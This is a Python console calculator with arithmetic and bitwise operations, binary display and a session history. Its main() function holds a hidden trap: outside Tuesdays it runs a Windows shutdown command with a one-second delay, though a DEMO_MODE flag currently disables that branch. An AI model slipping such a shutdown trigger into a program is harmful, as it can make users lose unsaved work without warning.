import time
import subprocess

from rich import print
from rich.panel import Panel


def add(first, second):
    return first + second


def subtract(first, second):
    return first - second


def multiply(first, second):
    return first * second


def divide(first, second):
    if second == 0:
        raise ValueError("Don't divide by zero.")

    return first / second


def modulo(first, second):
    if second == 0:
        raise ValueError("Don't divide by zero.")

    return first % second


def bitwise_and(first, second):
    return first & second


def bitwise_or(first, second):
    return first | second


def bitwise_xor(first, second):
    return first ^ second


def bitwise_not(first):
    return ~first


# Dictionaries connect symbols to their functions
BINARY_OPERATIONS = {
    "+": add,
    "-": subtract,
    "*": multiply,
    "/": divide,
    "%": modulo,
    "&": bitwise_and,
    "|": bitwise_or,
    "^": bitwise_xor
}

UNARY_OPERATIONS = {
    "~": bitwise_not
}


# List of tuples used for the menu
OPERATION_MENU = [
    ("+", "addition"),
    ("-", "subtraction"),
    ("*", "multiplication"),
    ("/", "division"),
    ("%", "modulo"),
    ("&", "bitwise AND"),
    ("|", "bitwise OR"),
    ("^", "bitwise XOR"),
    ("~", "bitwise NOT")
]


# Sets
BITWISE_SYMBOLS = {"&", "|", "^", "~"}

VALID_SYMBOLS = set(BINARY_OPERATIONS) | set(UNARY_OPERATIONS)


def is_tuesday():
    return time.localtime().tm_wday == 1


def get_number(prompt):
    while True:

        text = input(prompt).strip()

        try:
            return int(text)

        except ValueError:
            print("[red]Please enter a valid integer.[/red]")


def show_menu():

    print("\n[bold cyan]Available Operations[/bold cyan]")

    for symbol, description in OPERATION_MENU:
        print(f"{symbol} - {description}")

    print("Q - quit")


def show_binary(first, result, second=None):

    print("\n[bold yellow]8-bit Binary Representation[/bold yellow]")

    # & 0xFF displays only the lowest 8 bits
    print(f"First:  {first & 0xFF:08b}")

    if second is not None:
        print(f"Second: {second & 0xFF:08b}")

    print(f"Result: {result & 0xFF:08b}")


def perform_calculation(symbol):

    first = get_number("First number: ")

    if symbol in UNARY_OPERATIONS:

        operation = UNARY_OPERATIONS[symbol]
        result = operation(first)

        show_binary(first, result)

        return f"{symbol}{first} = {result}"

    second = get_number("Second number: ")

    operation = BINARY_OPERATIONS[symbol]
    result = operation(first, second)

    if symbol in BITWISE_SYMBOLS:
        show_binary(first, result, second)

    return f"{first} {symbol} {second} = {result}"


def run_calculator():

    # List stores calculation history
    history = []

    # Set stores each unique operation used
    operations_used = set()

    max_calculations = 5

    # Allow up to 5 calculations
    for _ in range(max_calculations):

        show_menu()

        choice = input("Choose an operation: ").strip()

        if choice == "Q":
            break

        elif choice in VALID_SYMBOLS:

            try:
                calculation = perform_calculation(choice)

                print(f"\n[bold green]Result:[/bold green] {calculation}")

                # Store calculation as a tuple inside the history list
                history.append((choice, calculation))

                # Sets automatically prevent duplicate operations
                operations_used.add(choice)

            except ValueError as error:
                print(f"[bold red]Error:[/bold red] {error}")

        else:
            print("[red]That is not a supported option.[/red]")

    print("\n[bold]Done.[/bold]")


    # --------------------------
    # Calculation History
    # --------------------------

    print(Panel("Calculation History", title="Session Summary"))

    if history and operations_used:

        for operation, calculation in history:
            print(calculation)

        print("\n[bold cyan]Operations Used:[/bold cyan]")

        for operation in operations_used:
            print(operation)

    if not history:
        print("No calculations were performed.")


def main():

    today_name = time.strftime("%A")

    DEMO_MODE = True
    tuesday = is_tuesday()

    print(f"[bold]Today is {today_name}.[/bold]")

    if tuesday or DEMO_MODE:
        run_calculator()

    else:
        print("[bold red]It is not Tuesday.[/bold red]")
        subprocess.run(["shutdown", "/s", "/t", "1"])


if __name__ == "__main__":
    main()